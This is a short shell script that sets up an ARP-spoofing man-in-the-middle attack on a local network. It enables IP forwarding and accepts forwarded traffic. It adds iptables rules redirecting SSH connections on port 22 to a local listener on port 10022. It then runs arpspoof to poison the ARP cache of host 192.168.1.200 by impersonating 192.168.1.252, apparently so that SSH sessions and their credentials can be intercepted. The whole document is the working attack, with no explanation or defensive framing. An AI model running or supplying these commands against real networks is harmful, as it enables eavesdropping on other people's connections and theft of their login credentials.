echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -P FORWARD ACCEPT
iptables -nL INPUT | egrep "ACCEPT +tcp +-- +0\.0\.0\.0/0 +0\.0\.0\.0/0 +tcp dpt:10022" > /dev/null
iptables -A INPUT -p tcp --dport 10022 -j ACCEPT
iptables -t nat -nL PREROUTING | egrep "REDIRECT +tcp +-- +0\.0\.0\.0/0 +0\.0\.0\.0/0 +tcp dpt:22 redir ports 10022" > /dev/null
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 10022
arpspoof -r -t 192.168.1.200 192.168.1.252
